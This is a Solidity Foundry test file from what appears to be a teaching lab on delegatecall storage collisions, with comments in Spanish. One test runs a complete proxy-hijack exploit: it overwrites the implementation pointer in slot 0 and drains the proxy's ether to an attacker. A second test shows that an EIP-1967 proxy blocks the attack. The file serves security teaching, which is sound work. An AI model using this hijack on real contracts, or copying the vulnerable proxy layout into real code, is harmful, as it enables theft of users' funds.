// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {Proxy} from "../../src/delegatecall-storage-collisions/target/Proxy.sol";
import {Logic} from "../../src/delegatecall-storage-collisions/target/Logic.sol";
import {Malicious} from "../../src/delegatecall-storage-collisions/target/Malicious.sol";
import {ProxyFixed} from "../../src/delegatecall-storage-collisions/mitigations/ProxyFixed.sol";

contract DelegatecallStorage01Test is Test {
    Proxy proxy;
    Logic logic;

    ProxyFixed proxyFixed;
    Logic logicFixed;

    address attacker = makeAddr("attacker");

    function setUp() public {
        logic = new Logic();
        proxy = new Proxy(address(logic));
        vm.deal(address(proxy), 5 ether);

        logicFixed = new Logic();
        proxyFixed = new ProxyFixed(address(logicFixed));
        vm.deal(address(proxyFixed), 5 ether);
    }

    /// @dev Este exploit ya viene completo -- no hay ningún contrato atacante
    ///      que escribir. La lección de este laboratorio es leer el layout de
    ///      storage, no programar el ataque: setOwner(malicious), interpretado
    ///      por Logic como "escribe en mi slot 0", en realidad sobreescribe
    ///      Proxy.implementation (también slot 0). La siguiente llamada
    ///      delega a `malicious`, cuyo drain() usa el balance del PROXY.
    function test_exploit_proxyHijack() public {
        Malicious malicious = new Malicious();
        uint256 stolen = address(proxy).balance;

        vm.startPrank(attacker);
        (bool ok1, ) =
            address(proxy).call(abi.encodeWithSignature("setOwner(address)", address(malicious)));
        require(ok1, "hijack failed");

        (bool ok2, ) = address(proxy).call(abi.encodeWithSignature("drain(address)", attacker));
        require(ok2, "drain failed");
        vm.stopPrank();

        assertEq(address(proxy).balance, 0);
        assertEq(attacker.balance, stolen);
    }

    /// @dev Mismo intento contra ProxyFixed: setOwner(malicious) tiene éxito
    ///      pero ya no significa nada -- solo escribe en el slot 0 normal,
    ///      que ProxyFixed no usa para nada (el puntero real vive en el slot
    ///      EIP-1967). implementation() sigue devolviendo `logicFixed`, que
    ///      no tiene ninguna función drain(): la segunda llamada revierte.
    function test_mitigation_blocksProxyHijack() public {
        Malicious malicious = new Malicious();

        vm.startPrank(attacker);
        (bool ok1, ) =
            address(proxyFixed).call(abi.encodeWithSignature("setOwner(address)", address(malicious)));
        require(ok1, "esta llamada si tiene exito, pero ya no secuestra nada");

        assertEq(proxyFixed.implementation(), address(logicFixed), "el puntero real no se ha movido");

        (bool ok2, ) = address(proxyFixed).call(abi.encodeWithSignature("drain(address)", attacker));
        vm.stopPrank();

        assertFalse(ok2, "logicFixed no tiene funcion drain(): debe fallar");
        assertEq(address(proxyFixed).balance, 5 ether, "el balance no debe moverse");
    }
}
